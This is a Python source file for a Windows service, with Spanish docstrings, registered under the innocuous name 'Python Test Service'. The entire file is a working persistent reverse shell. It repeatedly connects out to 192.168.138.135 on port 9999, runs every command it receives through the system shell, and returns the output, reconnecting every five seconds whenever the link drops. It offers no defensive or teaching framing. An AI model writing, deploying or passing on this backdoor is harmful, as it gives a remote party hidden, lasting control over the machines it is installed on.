import servicemanager
import win32serviceutil
import win32service
import win32event
import socket
import subprocess
import time
import sys

class PythonService(win32serviceutil.ServiceFramework):
    """Servicio de pruebas en Python.

    Este servicio se conecta a un servidor remoto, recibe comandos y los ejecuta.
    """

    _svc_name_ = "PythonTestService"
    _svc_display_name_ = "Python Test Service"
    _svc_description_ = "Este es un servicio de pruebas escrito en Python."

    def __init__(self, args):
        """Inicializa el servicio.

        Args:
            args (list): Lista de argumentos pasados al servicio.
        """
        super().__init__(args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        self.is_running = True

    def SvcStop(self):
        """Detiene el servicio."""
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)
        self.is_running = False

    def SvcDoRun(self):
        """Inicia el servicio."""
        servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE,
                              servicemanager.PYS_SERVICE_STARTED,
                              (self._svc_name_, ''))
        self.main()

    def run_command(self, command):
        """Ejecuta un comando en el sistema y devuelve la salida.

        Args:
            command (str): El comando a ejecutar.

        Returns:
            str: La salida del comando o un mensaje de error.
        """
        try:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate()
            if process.returncode == 0:
                return stdout
            else:
                return f"Error: {stderr}"
        except Exception as e:
            return str(e)

    def main(self):
        """Función principal del servicio.

        Se conecta a un servidor remoto y ejecuta comandos recibidos.
        """
        host = "192.168.138.135"
        port = 9999

        while self.is_running:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    sock.connect((host, port))
                    servicemanager.LogInfoMsg("Conexión establecida con el servidor remoto")

                    while True:
                        data = sock.recv(1024)
                        if not data:
                            break

                        command = data.decode().strip()

                        if command.lower() == 'exit':
                            break

                        response = self.run_command(command)
                        sock.sendall(response.encode())

            except Exception as e:
                servicemanager.LogErrorMsg(f"Error: {e}")
                servicemanager.LogErrorMsg("Intentando reconectar en 5 segundos...")
                time.sleep(5)

if __name__ == "__main__":
    if len(sys.argv) == 1:
        servicemanager.Initialize()
        servicemanager.PrepareToHostSingle(PythonService)
        servicemanager.StartServiceCtrlDispatcher()
    else:
        win32serviceutil.HandleCommandLine(PythonService)
